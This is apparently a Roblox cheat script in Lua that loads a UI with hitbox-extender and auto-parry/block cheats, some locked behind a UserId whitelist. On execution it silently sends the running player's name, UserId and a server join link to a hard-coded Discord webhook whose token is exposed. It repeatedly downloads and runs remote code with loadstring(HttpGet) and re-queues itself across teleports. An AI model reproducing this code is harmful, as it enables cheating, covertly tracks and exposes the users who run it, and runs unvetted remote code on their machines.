local webhookURL = "https://discord.com/api/webhooks/1365686244444733531/gyVCHBrkWBivxX9Tfbt4H2KfEYgnyod-lR4cZ07PyyFJ3QNl0WnMqx83jWwZl1DKxdvY"
local player = game.Players.LocalPlayer

local list = {
    7453817167, -- YOU
    4076780530, -- Friend
}

local isWhitelisted = table.find(list, player.UserId) ~= nil

local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local QueueOnTeleport = syn and syn.queue_on_teleport or queue_on_teleport

-- Send webhook notification when script is executed by anyone
local function sendWebhook()
    local joinLink = string.format("https://www.roblox.com/games/%d/?joinGameInstanceId=%s", game.PlaceId, game.JobId)
    local data = {
        content = string.format(
            "Player executed: **%s** (UserId: %d)\nJoin their game: %s",
            player.Name,
            player.UserId,
            joinLink
        )
    }
    local jsonData = HttpService:JSONEncode(data)

    local req = (syn and syn.request) or (request or http_request or http and http.request)
    if req then
        req({
            Url = webhookURL,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = jsonData
        })
    else
        warn("No compatible HTTP request function found for webhook.")
    end
end

sendWebhook()

local VLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/UI-Libs/main/Vape.txt"))()
local win = VLib:Window("BGSI", "Script", Color3.fromRGB(0,0,255), Enum.KeyCode.RightControl)

local Main = win:Tab("Main")

-- Everyone can see and use this button
Main:Button("Hitbox Extender", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/DroidloI/BGSI/main/HitboxExtender.lua"))()
end)

-- Whitelisted users get access to these buttons
if isWhitelisted then
    Main:Button("Auto Parry", function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/DroidloI/BGSI/main/AutoParry.lua"))()
    end)
    Main:Button("Auto Perfect Block", function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/DroidloI/BGSI/main/AutoPerfectBlock.lua"))()
    end)
    Main:Button("Auto Heavy Perfect Block", function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/DroidloI/BGSI/main/AutoHeavyPerfectBlock.lua"))()
    end)
    Main:Button("Auto DeepBroken", function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/DroidloI/BGSI/main/AutoDeepBroken.lua"))()
    end)
    Main:Button("Auto Insanity Perfect Block", function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/DroidloI/BGSI/main/AutoInsanityPerfectBlock.lua"))()
    end)
else
    Main:Label("Get whitelisted for full features!")
end

local Other = win:Tab("Other")
Other:Button("Anti Sleep", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/DroidloI/BGSI/main/AntiSleep.lua"))()
end)

-- Queue reload on teleport
QueueOnTeleport([[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/DroidloI/BGSI/main/Endless.lua"))()
]])
